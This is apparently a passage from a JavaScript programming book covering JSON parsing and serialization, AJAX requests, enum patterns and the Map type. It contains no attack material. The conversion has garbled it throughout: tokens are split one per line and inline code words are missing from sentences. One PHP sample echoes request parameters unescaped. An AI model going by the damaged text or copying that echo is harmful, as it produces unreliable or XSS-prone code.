or Number) inserted of readability. If a string is provided, the
string (first 10 characters) will be used as whitespaces.
>
JSON (JavaScript Object Notation) is a lightweight data-interchange
format. It is easy for humans to read and write and easy for machines
to parse and generate. It is important to realize that, in JavaScript,
JSON is a string and not an object.
>
A basic overview can be found on the [json.org](http://json.org/)
website which also contains links to implementations of the standard
in many different programming languages.

<h3 id="ch35-1">Section 35.1: JSON versus JavaScript literals</h3>

  
  eval
  

  

JSON stands for &quot;JavaScript Object Notation&quot;, but it&apos;s not
JavaScript. Think of it as just a *data serialization format* that
*happens* to be directly usable as a JavaScript literal. However, it
is not advisable to directly run (i.e. through ()) JSON that is
fetched from an external source. Functionally, JSON isn&apos;t very
different from XML or YAML  some confusion can be avoided if JSON is
just imagined as some serialization format that looks very much like
JavaScript.
>
Even though the name implies just objects, and even though the
majority of use cases through some kind of API always happen to be
objects and arrays, JSON is not for just objects or arrays. The
following primitive types are supported:
>
String (e.g. &quot;Hello World!&quot;)
>
Number (e.g. 42)
>
Boolean (e.g. **true**)
>
The value **null**
>
**undefined** is not supported in the sense that an undefined property
will be omitted from JSON upon serialization. Therefore, there is no
way to deserialize JSON and end up with a property whose value is
**undefined**.
>
The string &quot;42&quot; is valid JSON. JSON doesn&apos;t always have to have an
outer envelope of &quot;{&hellip;}&quot; or &quot;&lbrack;&hellip;&rbrack;&quot;.
>
While some JSON is also valid JavaScript and some JavaScript is also
valid JSON, there are some subtle differences between both languages
and neither language is a subset of the other.
>
Take the following JSON string as an example:

{

&quot;color&quot;

:

&quot;blue&quot;

}

This can be directly inserted into JavaScript. It will be
syntactically valid and will yield the correct value:

**const**

skin

=

{

&quot;color&quot;

:

&quot;blue&quot;

}

;

However, we know that &quot;color&quot; is a valid identifier name and the
quotes around the property name can be omitted:

**const**

skin

=

{

color

:

&quot;blue&quot;

}

;

We also know that we can use single quotes instead of double quotes:

**const**

skin

=

{

&apos;color&apos;

:

&apos;blue&apos;

}

;

But, if we were to take both of these literals and treat them as JSON,
**neither will be syntactically valid** JSON:

{

color

:

&quot;blue&quot;

}

{

&apos;color&apos;

:

&apos;blue&apos;

}

JSON strictly requires all property names to be double quoted and
string values to be double quoted as well.
>
It&apos;s common for JSON-newcomers to attempt to use code excerpts with
JavaScript literals as JSON, and scratch their heads about the syntax
errors they are getting from the JSON parser.
>
More confusion starts arising when *incorrect terminology* is applied
in code or in conversation.
>
A common anti-pattern is to name variables that hold non-JSON values
as &quot;json&quot;:

fetch

(

url

)

.

then

(

**function**

(

response

)

{

**const**

json

=

JSON.

parse

(

response.

data

)

;

*// Confusion ensues!*

*// We&apos;re done with the notion of &quot;JSON&quot; at this point,*

*// but the concept stuck with the variable name.*

}

)

;

  
  response.data
  

  

In the above example, is a JSON string that is returned by some API.
JSON stops at the HTTP response domain. The variable with the &quot;json&quot;
misnomer holds just a JavaScript value (could be an object, an array,
or even a simple number!)
>
A less confusing way to write the above is:

fetch

(

url

)

.

then

(

**function**

(

response

)

{

**const**

value

=

JSON.

parse

(

response.

data

)

;

*// We&apos;re done with the notion of &quot;JSON&quot; at this point.*

*// You don&apos;t talk about JSON after parsing JSON.*

}

)

;

Developers also tend to throw the phrase &quot;JSON object&quot; around a lot.
This also leads to confusion. Because as mentioned above, a JSON
string doesn&apos;t have to hold an object as a value. &quot;JSON string&quot; is
a better term. Just like &quot;XML string&quot; or &quot;YAML string&quot;. You get a
string, you parse it, and you end up with a value.

<h3 id="ch35-2">Section 35.2: Parsing with a reviver function</h3>

A reviver function can be used to filter or transform the value being
parsed.

Version ≥ 5.1

**var**

jsonString

=

&apos;&lbrack;{&quot;name&quot;:&quot;John&quot;,&quot;score&quot;:51},{&quot;name&quot;:&quot;Jack&quot;,&quot;score&quot;:17}&rbrack;&apos;

;

**var**

data

=

JSON.

parse

(

jsonString

,

**function**

reviver

(

key

,

value

)

{

**return**

key

===

&apos;name&apos;

?

value.

toUpperCase

(

)

:

value

;

}

)

;

Version ≥ 6

**const**

jsonString

=

&apos;&lbrack;{&quot;name&quot;:&quot;John&quot;,&quot;score&quot;:51},{&quot;name&quot;:&quot;Jack&quot;,&quot;score&quot;:17}&rbrack;&apos;

;

**const**

data

=

JSON.

parse

(

jsonString

,

(

key

,

value

)

=&gt;

key

===

&apos;name&apos;

?

value.

toUpperCase

(

)

:

value

)

;

This produces the following result:

&lbrack;

{

&apos;name&apos;

:

&apos;JOHN&apos;

,

&apos;score&apos;

:

51

}

,

{

&apos;name&apos;

:

&apos;JACK&apos;

,

&apos;score&apos;

:

17

}

&rbrack;

This is particularly useful when data must be sent that needs to be
serialized/encoded when being transmitted with JSON, but one wants to
access it deserialized/decoded. In the following example, a date was
encoded to its ISO 8601 representation. We use the reviver function to
parse this in a JavaScript Date.

Version ≥ 5.1

**var**

jsonString

=

&apos;{&quot;date&quot;:&quot;2016-01-04T23:00:00.000Z&quot;}&apos;

;

**var**

data

=

JSON.

parse

(

jsonString

,

**function**

(

key

,

value

)

{

**return**

(

key

===

&apos;date&apos;

)

?

**new**

Date

(

value

)

:

value

;

}

)

;

Version ≥ 6

**const**

jsonString

=

&apos;{&quot;date&quot;:&quot;2016-01-04T23:00:00.000Z&quot;}&apos;

;

**const**

data

=

JSON.

parse

(

jsonString

,

(

key

,

value

)

=&gt;

key

===

&apos;date&apos;

?

**new**

Date

(

value

)

:

value

)

;

It is important to make sure the reviver function returns a useful
value at the end of each iteration. If the reviver function returns
**undefined**, no value or the execution falls off towards the end of
the function, the property is deleted from the object. Otherwise, the
property is redefined to be the return value.

<h3 id="ch35-3">Section 35.3: Serializing a value</h3>

  
  JSON.stringify
  

  

A JavaScript value can be converted to a JSON string using the
function.

JSON.

stringify

(

value

&lbrack;

,

replacer

&lbrack;

,

space

&rbrack;

&rbrack;

)

1.  value The value to convert to a JSON string.

*/&ast; Boolean &ast;/* JSON.stringify(**true**) *// &apos;true&apos;*
>
*/&ast; Number &ast;/* JSON.stringify(12) *// &apos;12&apos;*
>
*/&ast; String &ast;/* JSON.stringify(&apos;foo&apos;) *// &apos;&quot;foo&quot;&apos;*
>
*/&ast; Object &ast;/* JSON.stringify({}) *// &apos;{}&apos;*
>
JSON.stringify({foo: &apos;baz&apos;}) *// &apos;{&quot;foo&quot;: &quot;baz&quot;}&apos;*
>
*/&ast; Array &ast;/* JSON.stringify(&lbrack;1, **true**, &apos;foo&apos;&rbrack;) *// &apos;&lbrack;1,
true, &quot;foo&quot;&rbrack;&apos;*
>
*/&ast; Date &ast;/* JSON.stringify(**new** Date()) *//
&apos;&quot;2016-08-06T17:25:23.588Z&quot;&apos;*
>
*/&ast; Symbol &ast;/* JSON.stringify({x:Symbol()}) *// &apos;{}&apos;*

2.  replacer A function that alters the behaviour of the stringification
    process or an array of String and Number objects that serve as a
    whitelist for filtering the properties of the value object to be
    included in the JSON string. If this value is null or is not
    provided, all properties of the object are included in the resulting
    JSON string.

*// replacer as a function*

**function**

replacer

(

key

,

value

)

{

*// Filtering out properties*

**if**

(

**typeof**

value

===

&quot;string&quot;

)

{

**return**

}

**return**

value

}

**var**

foo

=

{

foundation

:

&quot;Mozilla&quot;

,

model

:

&quot;box&quot;

,

week

:

45

,

transport

:

&quot;car&quot;

,

month

:

7

}

JSON.

stringify

(

foo

,

replacer

)

*// -&amp;apos;{&quot;week&quot;: 45, &quot;month&quot;: 7}&apos;*

*// replacer as an array*

JSON.

stringify

(

foo

,

&lbrack;

&apos;foundation&apos;

,

&apos;week&apos;

,

&apos;month&apos;

&rbrack;

)

*// -&amp;apos;{&quot;foundation&quot;: &quot;Mozilla&quot;, &quot;week&quot;: 45, &quot;month&quot;: 7}&apos;*

*// only the &grave;foundation&grave;, &grave;week&grave;, and &grave;month&grave; properties are
kept*

3.  space For readability, the number of spaces used for indentation may
    be specified as the third parameter.

JSON.

stringify

(

{

x

:

1

,

y

:

1

}

,

**null**

,

2

)

*// 2 space characters will be used for indentation*

*/&ast; output:*

*{*

*&apos;x&apos;: 1,*

*&apos;y&apos;: 1*

*}*

*&ast;/*

  
  **&bsol;&bsol;t**
  

  

Alternatively, a string value can be provided to use for indentation.
For example, passing &apos;&apos; will cause the tab character to be used for
indentation.

JSON.

stringify

(

{

x

:

1

,

y

:

1

}

,

**null**

,

&apos;

**&bsol;&bsol;t**

&apos;

)

*/&ast; output:*

*{*

*&apos;x&apos;: 1,*

*&apos;y&apos;: 1*

*}*

*&ast;/*

<h3 id="ch35-4">Section 35.4: Serializing and restoring class instances</h3>

You can use a custom toJSON method and reviver function to transmit
instances of your own class in JSON. If an object has a toJSON method,
its result will be serialized instead of the object itself.

Version &lt; 6

**function**

Car

(

color

,

speed

)

{

**this**

.

color

=

color

;

**this**

.

speed

=

speed

;

}

Car.

**prototype**

.

toJSON

=

**function**

(

)

{

**return**

{

&dollar;type

:

&apos;com.example.Car&apos;

,

color

:

**this**

.

color

,

speed

:

**this**

.

speed

}

;

}

;

Car.

fromJSON

=

**function**

(

data

)

{

**return**

**new**

Car

(

data.

color

,

data.

speed

)

;

}

;

Version

≥

6

class

Car

{

constructor

(

color

,

speed

)

{

**this**

.

color

=

color

;

**this**

.

speed

=

speed

;

**this**

.

id&lowbar;

=

Math

.

random

(

)

;

}

toJSON

(

)

{

**return**

{

&dollar;type

:

&apos;com.example.Car&apos;

,

color

:

**this**

.

color

,

speed

:

**this**

.

speed

}

;

}

**static**

fromJSON

(

data

)

{

**return**

**new**

Car

(

data.

color

,

data.

speed

)

;

}

}

**var**

userJson

=

JSON.

stringify

(

{

name

:

&quot;John&quot;

,

car

:

**new**

Car

(

&apos;red&apos;

,

&apos;fast&apos;

)

}

)

;

This produces the a string with the following content:
>
{&quot;name&quot;:&quot;John&quot;,&quot;car&quot;:{&quot;&dollar;type&quot;:&quot;com.example.Car&quot;,&quot;color&quot;:&quot;red&quot;,&quot;speed&quot;:&quot;fast&quot;}}
>
**var** userObject = JSON.parse(userJson, **function** reviver(key,
value) { **return** (value && value.&dollar;type === &apos;com.example.Car&apos;) ?
Car.fromJSON(value) : value; });
>
This produces the following object:

{

name

:

&quot;John&quot;

,

car

:

Car

{

color

:

&quot;red&quot;

,

speed

:

&quot;fast&quot;

,

id&lowbar;

:

0.19349242527065402

}

}

<h3 id="ch35-5">Section 35.5: Serializing with a replacer function</h3>

A replacer function can be used to filter or transform values being
serialized.

**const**

userRecords

=

&lbrack;

{

name

:

&quot;Joe&quot;

,

points

:

14.9

,

level

:

31.5

}

,

{

name

:

&quot;Jane&quot;

,

points

:

35.5

,

level

:

74.4

}

,

{

name

:

&quot;Jacob&quot;

,

points

:

18.5

,

level

:

41.2

}

,

{

name

:

&quot;Jessie&quot;

,

points

:

15.1

,

level

:

28.1

}

,

&rbrack;

;

*// Remove names and round numbers to integers to anonymize records
before sharing*

**const**

anonymousReport

=

JSON.

stringify

(

userRecords

,

(

key

,

value

)

=&gt;

key

===

&apos;name&apos;

?

**undefined**

:

(

**typeof**

value

===

&apos;number&apos;

?

Math

.

floor

(

value

)

:

value

)

)

;

This produces the following string:

&apos;&lbrack;{&quot;points&quot;:14,&quot;level&quot;:31},{&quot;points&quot;:35,&quot;level&quot;:74},{&quot;points&quot;:18,&quot;level&quot;:41},{&quot;points&quot;:15,&quot;level&quot;:2

8}&rbrack;

&apos;

<h3 id="ch35-6">Section 35.6: Parsing a simple JSON string</h3>

  
  JSON.parse
  

  

The () method parses a string as JSON and returns a JavaScript
primitive, array or object:
>
**const** array = JSON.parse(&apos;&lbrack;1, 2, &quot;c&quot;, &quot;d&quot;, {&quot;e&quot;:
false}&rbrack;&apos;); console.log(array); *// logs: &lbrack;1, 2, &quot;c&quot;, &quot;d&quot;, {e:
false}&rbrack;*

<h3 id="ch35-7">Section 35.7: Cyclic object values</h3>

Not all objects can be converted to a JSON string. When an object has
cyclic self-references, the conversion will fail. This is typically
the case for hierarchical data structures where parent and child both
reference each other:

**const**

world

=

{

name

:

&apos;World&apos;

,

regions

:

&lbrack;

&rbrack;

}

;

world.

regions

.

push

(

{

name

:

&apos;North America&apos;

,

parent

:

&apos;America&apos;

}

)

;

console.

log

(

JSON.

stringify

(

world

)

)

;

*// {&quot;name&quot;:&quot;World&quot;,&quot;regions&quot;:&lbrack;{&quot;name&quot;:&quot;North
America&quot;,&quot;parent&quot;:&quot;America&quot;}&rbrack;}*

world.

regions

.

push

(

{

name

:

&apos;Asia&apos;

,

parent

:

world

}

)

;

console.

log

(

JSON.

stringify

(

world

)

)

;

*// Uncaught TypeError: Converting circular structure to JSON*

As soon as the process detects a cycle, the exception is raised. If
there were no cycle detection, the string would be infinitely long.

<h2 id="ch36">Chapter 36: AJAX</h2>

AJAX stands for &quot;Asynchronous JavaScript and XML&quot;. Although the name
includes XML, JSON is more often used due to its simpler formatting
and lower redundancy. AJAX allows the user to communicate with
external resources without reloading the webpage.

<h3 id="ch36-1">Section 36.1: Sending and Receiving JSON Data via POST</h3>

Version ≥ 6

  
  json
  

  

Fetch request promises initially return Response objects. These will
provide response header information, but they don&apos;t directly include
the response body, which may not have even loaded yet. Methods on the
Response object such as .() can be used to wait for the response body
to load, then parse it.

**const**

requestData

=

{

method

:

&apos;getUsers&apos;

}

;

**const**

usersPromise

=

fetch

(

&apos;/api&apos;

,

{

method

:

&apos;POST&apos;

,

body

:

JSON.

stringify

(

requestData

)

}

)

.

then

(

response

=&gt;

{

**if**

(

!

response.

ok

)

{

**throw**

**new**

Error

(

&quot;Got non-2XX response from API server.&quot;

)

;

}

**return**

response.

json

(

)

;

}

)

.

then

(

responseData

=&gt;

{

**return**

responseData.

users

;

}

)

;

usersPromise.

then

(

users

=&gt;

{

console.

log

(

&quot;Known users: &quot;

,

users

)

;

}

,

error

=&gt;

{

console.

error

(

&quot;Failed to fetch users due to error: &quot;

,

error

)

;

}

)

;

<h3 id="ch36-2">Section 36.2: Add an AJAX preloader</h3>

Here&apos;s a way to show a GIF preloader while an AJAX call is executing.
We need to prepare our add and remove preloader functions:

**function**

addPreloader

(

)

{

*// if the preloader doesn&apos;t already exist, add one to the page*

**if**

(

!

document.

querySelector

(

&apos;#preloader&apos;

)

)

{

**var**

preloaderHTML

=

&apos;&lt;img id=&quot;preloader&quot; src=&quot;https://goo.gl/cNhyvX&quot; /&gt;&apos;

;

document.

querySelector

(

&apos;body&apos;

)

.

innerHTML

+=

preloaderHTML

;

}

}

**function**

removePreloader

(

)

{

*// select the preloader element*

**var**

preloader

=

document.

querySelector

(

&apos;#preloader&apos;

)

;

*// if it exists, remove it from the page*

**if**

(

preloader

)

{

preloader.

remove

(

)

;

}

}

Now we&apos;re going to look at where to use these functions.

**var**

request

=

**new**

XMLHttpRequest

(

)

;

  
  request.readyState ==
  

  

Inside the onreadystatechange function you should have an if statement
with condition: 4

  
  && request.status == 200
  

  

.

  
  removePreloader
  

  

If **true**: the request is finished and response is ready that&apos;s
where we&apos;ll use ().

  
  addPreloader
  

  

Else if **false**: the request is still in progress, in this case
we&apos;ll run the function ()

xmlhttp.

onreadystatechange

=

**function**

(

)

{

**if**

(

request.

readyState

==

4

&&

request.

status

==

200

)

{

*// the request has come to an end, remove the preloader*

removePreloader

(

)

;

}

**else**

{

*// the request isn&apos;t finished, add the preloader*

addPreloader

(

)

}

}

;

xmlhttp.

open

(

&apos;GET&apos;

,

your_file.

php

,

**true**

)

;

xmlhttp.

send

(

)

;

<h3 id="ch36-3">Section 36.3: Displaying the top JavaScript questions of the month from Stack Overflow&apos;s API</h3>

We can make an AJAX request to [Stack Exchange&apos;s
API](http://api.stackexchange.com/docs) to retrieve a list of the top
JavaScript questions for the month, then present them as a list of
links. If the request fails or the returns an API error, our promise
error handling displays the error instead.

Version ≥ 6

[View live results on
HyperWeb](http://plume-pine.hyperweb.space/hot-javascript.html).

**const**

url

=

&apos;http://api.stackexchange.com/2.2/questions?site=stackoverflow&apos;

&plus;

&apos;&tagged=javascript&sort=month&filter=unsafe&key=gik4BOCMC7J9doavgYteRw((&apos;

;

fetch

(

url

)

.

then

(

response

=&gt;

response.

json

(

)

)

.

then

(

data

=&gt;

{

**if**

(

data.

error_message

)

{

**throw**

**new**

Error

(

data.

error_message

)

;

}

**const**

list

=

document.

createElement

(

&apos;ol&apos;

)

;

document.

body

.

appendChild

(

list

)

;

**for**

(

**const**

{

title

,

link

}

of data.

items

)

{

**const**

entry

=

document.

createElement

(

&apos;li&apos;

)

;

**const**

hyperlink

=

document.

createElement

(

&apos;a&apos;

)

;

entry.

appendChild

(

hyperlink

)

;

list.

appendChild

(

entry

)

;

hyperlink.

textContent

=

title

;

hyperlink.

href

=

link

;

}

}

)

.

then

(

**null**

,

error

=&gt;

{

**const**

message

=

document.

createElement

(

&apos;pre&apos;

)

;

document.

body

.

appendChild

(

message

)

;

message.

style

.

color

=

&apos;red&apos;

;

message.

textContent

=

String

(

error

)

;

}

)

;

<h3 id="ch36-4">Section 36.4: Using GET with parameters</h3>

This function runs an AJAX call using GET allowing us to send
**parameters** (object) to a **file** (string) and launch a
**callback** (function) when the request has been ended.

**function**

ajax

(

file

,

params

,

callback

)

{

**var**

url

=

file

&plus;

&apos;?&apos;

;

*// loop through object and assemble the url*

**var**

notFirst

=

**false**

;

**for**

(

**var**

key

**in**

params

)

{

**if**

(

params.

hasOwnProperty

(

key

)

)

{

url

+=

(

notFirst

?

&apos;&&apos;

:

&apos;&apos;

)

&plus;

key

&plus;

&quot;=&quot;

&plus;

params

&lbrack;

key

&rbrack;

;

}

notFirst

=

**true**

;

}

*// create a AJAX call with url as parameter*

**var**

xmlhttp

=

**new**

XMLHttpRequest

(

)

;

xmlhttp.

onreadystatechange

=

**function**

(

)

{

**if**

(

xmlhttp.

readyState

==

4

&&

xmlhttp.

status

==

200

)

{

callback

(

xmlhttp.

responseText

)

;

}

}

;

xmlhttp.

open

(

&apos;GET&apos;

,

url

,

**true**

)

;

xmlhttp.

send

(

)

;

}

Here&apos;s how we use it:
>
ajax(&apos;cars.php&apos;, {type:&quot;Volvo&quot;, model:&quot;300&quot;, color:&quot;purple&quot;},
**function**(response) {
>
*// add here the code to be executed when data comes back to this
page* *// for example console.log(response) will show the AJAX
response in console* });

  
  cars.php
  

  

And the following shows how to retrieve the url parameters in :
>
**if**(isset(&dollar;&lowbar;REQUEST&lbrack;&apos;type&apos;&rbrack;, &dollar;&lowbar;REQUEST&lbrack;&apos;model&apos;&rbrack;,
&dollar;&lowbar;REQUEST&lbrack;&apos;color&apos;&rbrack;)) { *// they are set, we can use them !*
>
&dollar;response = &apos;The color of your car is &apos; . &dollar;&lowbar;REQUEST&lbrack;&apos;color&apos;&rbrack;
. &apos;. &apos;;
>
&dollar;response .= &apos;It is a &apos; . &dollar;&lowbar;REQUEST&lbrack;&apos;type&apos;&rbrack; . &apos; model &apos; .
&dollar;&lowbar;REQUEST&lbrack;&apos;model&apos;&rbrack; . &apos;!&apos;; echo &dollar;response; }

  -
  console.log                             (   response
    

  -

If you had ) in callback function the result in console would have
been:

The color of your car is purple. It is a Volvo model 300!

<h3 id="ch36-5">Section 36.5: Check if a file exists via a HEAD request</h3>

This function executes an AJAX request using the HEAD method allowing
us to **check whether a file exists in the directory** given as an
argument. It also enables us to **launch a callback for each case**
(success, failure).

**function**

fileExists

(

dir

,

successCallback

,

errorCallback

)

{

**var**

xhttp

=

**new**

XMLHttpRequest

;

*/&ast; Check the status code of the request &ast;/*

xhttp.

onreadystatechange

=

**function**

(

)

{

**return**

(

xhttp.

status

!==

404

)

?

successCallback

:

errorCallback

;

}

;

*/&ast; Open and send the request &ast;/*

xhttp.

open

(

&apos;head&apos;

,

dir

,

**false**

)

;

xhttp.

send

(

)

;

}

;

<h3 id="ch36-6">Section 36.6: Using GET and no parameters</h3>

**var**

xhttp

=

**new**

XMLHttpRequest

(

)

;

xhttp.

onreadystatechange

=

**function**

(

)

{

**if**

(

xhttp.

readyState

===

XMLHttpRequest.

DONE

&&

xhttp.

status

===

200

)

{

*//parse the response in xhttp.responseText;*

}

}

;

xhttp.

open

(

&quot;GET&quot;

,

&quot;ajax_info.txt&quot;

,

**true**

)

;

xhttp.

send

(

)

;

Version

≥

6

The fetch API is a newer promise-based way to make asynchronous HTTP
requests.

fetch

(

&apos;/&apos;

)

.

then

(

response

=&gt;

response.

text

(

)

)

.

then

(

text

=&gt;

{

console.

log

(

&quot;The home page is &quot;

&plus;

text.

length

&plus;

&quot; characters long.&quot;

)

;

}

)

;

<h3 id="ch36-7">Section 36.7: Listening to AJAX events at a global level</h3>

*// Store a reference to the native method*

**let**

open

=

XMLHttpRequest.

**prototype**

.

open

;

*// Overwrite the native method*

XMLHttpRequest.

**prototype**

.

open

=

**function**

(

)

{

*// Assign an event listener*

**this**

.

addEventListener

(

&quot;load&quot;

,

event

=&gt;

console.

log

(

XHR

)

,

**false**

)

;

*// Call the stored reference to the native method*

open.

apply

(

**this**

,

arguments

)

;

}

;

<h2 id="ch37">Chapter 37: Enumerations</h2>

<h3 id="ch37-1">Section 37.1: Enum definition using Object.freeze()</h3>

Version ≥ 5.1

JavaScript does not directly support enumerators but the functionality
of an enum can be mimicked.

*// Prevent the enum from being changed*

**const**

TestEnum

=

Object

.

freeze

(

{

One

:

1

,

Two

:

2

,

Three

:

3

}

)

;

*// Define a variable with a value from the enum*

**var**

x

=

TestEnum.

Two

;

*// Prints a value according to the variable&apos;s enum value*

**switch**

(

x

)

{

**case**

TestEnum.

One

:

console.

log

(

&quot;111&quot;

)

;

**break**

;

**case**

TestEnum.

Two

:

console.

log

(

&quot;222&quot;

)

;

}

The above enumeration definition, can also be written as follows:

**var**

TestEnum

=

{

One

:

1

,

Two

:

2

,

Three

:

3

}

Object

.

freeze

(

TestEnum

)

;

After that you can define a variable and print like before.

<h3 id="ch37-2">Section 37.2: Alternate definition</h3>

  
  Object.freeze()
  

  

The method is available since version 5.1. For older versions, you can
use the following code (note that it also works in versions 5.1 and
later):

**var**

ColorsEnum

=

{

WHITE

:

0

,

GRAY

:

1

,

BLACK

:

2

}

*// Define a variable with a value from the enum*

**var**

currentColor

=

ColorsEnum.

GRAY

;

<h3 id="ch37-3">Section 37.3: Printing an enum variable</h3>

After defining an enum using any of the above ways and setting a
variable, you can print both the variable&apos;s value as well as the
corresponding name from the enum for the value. Here&apos;s an example:

*// Define the enum*

**var**

ColorsEnum

=

{

WHITE

:

0

,

GRAY

:

1

,

BLACK

:

2

}

Object

.

freeze

(

ColorsEnum

)

;

*// Define the variable and assign a value*

**var**

color

=

ColorsEnum.

BLACK

;

**if**

(

color

==

ColorsEnum.

BLACK

)

{

console.

log

(

color

)

;

*// This will print &quot;2&quot;*

**var**

ce

=

ColorsEnum

;

**for**

(

**var**

name

**in**

ce

)

{

**if**

(

ce

&lbrack;

name

&rbrack;

==

ce.

BLACK

)

console.

log

(

name

)

;

*// This will print &quot;BLACK&quot;*

}

}

<h3 id="ch37-4">Section 37.4: Implementing Enums Using Symbols</h3>

As ES6 introduced
[**Symbols**](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Symbol),
which are both **unique and immutable primitive values** that may be
used as the key of an Object property, instead of using strings as
possible values for an enum, it&apos;s possible to use symbols.

*// Simple symbol*

**const**

newSymbol

=

Symbol

(

)

;

**typeof**

newSymbol

===

&apos;symbol&apos;

*// true*

*// A symbol with a label*

**const**

anotherSymbol

=

Symbol

(

&quot;label&quot;

)

;

*// Each symbol is unique*

**const**

yetAnotherSymbol

=

Symbol

(

&quot;label&quot;

)

;

yetAnotherSymbol

===

anotherSymbol

;

*// false*

**const**

Regnum_Animale

=

Symbol

(

)

;

**const**

Regnum_Vegetabile

=

Symbol

(

)

;

**const**

Regnum_Lapideum

=

Symbol

(

)

;

**function**

describe

(

kingdom

)

{

**switch**

(

kingdom

)

{

**case**

Regnum_Animale

:

**return**

&quot;Animal kingdom&quot;

;

**case**

Regnum_Vegetabile

:

**return**

&quot;Vegetable kingdom&quot;

;

**case**

Regnum_Lapideum

:

**return**

&quot;Mineral kingdom&quot;

;

}

}

describe

(

Regnum_Vegetabile

)

;

*// Vegetable kingdom*

The [Symbols in ECMAScript
6](http://www.2ality.com/2014/12/es6-symbols.html) article covers this
new primitive type more in detail.

<h3 id="ch37-5">Section 37.5: Automatic Enumeration Value</h3>

Version ≥ 5.1

This Example demonstrates how to automatically assign a value to each
entry in an enum list. This will prevent two enums from having the
same value by mistake. NOTE: [Object.freeze browser
support](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze)

**var**

testEnum

=

**function**

(

)

{

*// Initializes the enumerations*

**var**

enumList

=

&lbrack;

&quot;One&quot;

,

&quot;Two&quot;

,

&quot;Three&quot;

&rbrack;

;

enumObj

=

{

}

;

enumList.

forEach

(

(

item

,

index

)

=&gt;

enumObj

&lbrack;

item

&rbrack;

=

index

&plus;

1

)

;

*// Do not allow the object to be changed*

Object

.

freeze

(

enumObj

)

;

**return**

enumObj

;

}

(

)

;

console.

log

(

testEnum.

One

)

;

*// 1 will be logged*

**var**

x

=

testEnum.

Two

;

**switch**

(

x

)

{

**case**

testEnum.

One

:

console.

log

(

&quot;111&quot;

)

;

**break**

;

**case**

testEnum.

Two

:

console.

log

(

&quot;222&quot;

)

;

*// 222 will be logged*

**break**

;

}

<h2 id="ch38">Chapter 38: Map</h2>

**Parameter Details**

  -
  key                   ,       value
   - -

  -

iterable Any iterable object (for example an array) containing &lbrack;&rbrack;
pairs. key The key of an element. value The value assigned to the key.
callback Callback function called with three parameters: value, key,
and the map. thisArg Value which will be used as **this** when
executing callback.

<h3 id="ch38-1">Section 38.1: Creating a Map</h3>

A Map is a basic mapping of keys to values. Maps are different from
objects in that their keys can be anything (primitive values as well
as objects), not just strings and symbols. Iteration over Maps is also
always done in the order the items were inserted into the Map, whereas
the order is undefined when iterating over keys in an object. To
create a Map, use the Map constructor:

**const**

map

=

**new**

Map

(

)

;

It has an optional parameter, which can be any iterable object (for
example an array) which contains arrays of two elements  first is
the key, the seconds is the value. For example:
>
**const** map = **new** Map(&lbrack;&lbrack;**new** Date(), {foo: &quot;bar&quot;}&rbrack;,
&lbrack;document.body, &quot;body&quot;&rbrack;&rbrack;);
>
*// &Hat;key &Hat;value &Hat;key &Hat;value*

## Section 38.2: Clearing a Map

  
  clear
  

  

To remove all elements from a Map, use the .() method:

map.

clear

(

)

;

Example:

**const**

map

=

**new**

Map

(

&lbrack;

&lbrack;

1

,

2

&rbrack;

,

&lbrack;

3

,

4

&rbrack;

&rbrack;

)

;

console.

log

(

map.

size

)

;

*// 2*

map.

clear

(

)

;

console.

log

(

map.

size

)

;

*// 0*

console.

log

(

map.

**get**

(

1

)

)

;

*// undefined*

## Section 38.3: Removing an element from a Map

  
  **delete**
  

  

To remove an element from a map use the .() method.

map.

**delete**

(

key

)

;

Example:

**const**

map

=

**new**

Map

(

&lbrack;

&lbrack;

1

,

2

&rbrack;

,

&lbrack;

3

,

4

&rbrack;

&rbrack;

)

;

console.

log

(

map.

**get**

(

3

)

)

;

*// 4*

map.

**delete**

(

3

)

;

console.

log

(

map.

**get**

(

3

)

)

;

*// undefined*

This method returns **true** if the element existed and has been
removed, otherwise **false**:

**const**

map

=

**new**

Map

(

&lbrack;

&lbrack;

1

,

2

&rbrack;

,

&lbrack;

3

,

4

&rbrack;

&rbrack;

)

;

console.

log

(

map.

**delete**

(

1

)

)

;

*// true*

console.

log

(

map.

**delete**

(

7

)

)

;

*// false*

## Section 38.4: Checking if a key exists in a Map

  
  has
  

  

To check if a key exists in a Map, use the .() method:

map.

has

(

key

)

;

Example:

**const**

map

=

**new**

Map

(

&lbrack;

&lbrack;

1

,

2

&rbrack;

,

&lbrack;

3

,

4

&rbrack;

&rbrack;

)

;

console.

log

(

map.

has

(

1

)

)

;

*// true*

console.

log

(

map.

has

(

2

)

)

;

*// false*

## Section 38.5: Iterating Maps

  
  keys    (), .   values     () and .      entries      (). .   entries
  - - - -  - 

  

Map has three methods which returns iterators: .() is the default

  -
  key                   ,       value
   - -

  -

Map iterator, and contains &lbrack;&rbrack; pairs.

**const**

map

=

**new**

Map

(

&lbrack;

&lbrack;

1

,

2

&rbrack;

,

&lbrack;

3

,

4

&rbrack;

&rbrack;

)

;

**for**

(

**const**

&lbrack;

key

,

value

&rbrack;

of map

)

{

console.

log

(

&grave;key

:

&dollar;

{

key

}

,

value

:

&dollar;

{

value

}

&grave;

)

;

*// logs:*

*// key: 1, value: 2*

*// key: 3, value: 4*

}

**for**

(

**const**

key of map.

keys

(

)

)

{

console.

log

(

key

)

;

*// logs 1 and 3*

}

**for**

(

**const**

value of map.

values

(

)

)

{

console.

log

(

value

)

;

*// logs 2 and 4*

}

  
  forEach
  

  

Map also has .() method. The first parameter is a callback function,
which will be called for each element in the map, and the second
parameter is the value which will be used as **this** when executing
the callback function.
>
The callback function has three arguments: value, key, and the map
object.

**const**

map

=

**new**

Map

(

&lbrack;

&lbrack;

1

,

2

&rbrack;

,

&lbrack;

3

,

4

&rbrack;

&rbrack;

)

;

map.

forEach

(

(

value

,

key

,

theMap

)

=&gt;

console.

log

(

&grave;key

:

&dollar;

{

key

}

,

value

:

&dollar;

{

value

}

&grave;

)

)

;

*// logs:*

*// key: 1, value: 2*

*// key: 3, value: 4*

## Section 38.6: Getting and setting elements

  
  **get**   (   key   ) to get value by key and .          **set**   (   key   ,   value
    - -   -  

  

Use .) to assign a value to a key.

  
  **get**
  

  

If the element with the specified key doesn&apos;t exist in the map, .()
returns **undefined**.

  -
  .**set**()   method returns the map object, so you can chain         .**set**()
    

  -

calls.

**const**

map

=

**new**

Map

(

)

;

console.

log

(

map.

**get**

(

1

)

)

;

*// undefined*

map.

**set**

(

1

,

2

)

.

**set**

(

3

,

4

)

;

console.

log

(

map.

**get**

(

1

)

)

;

*// 2*

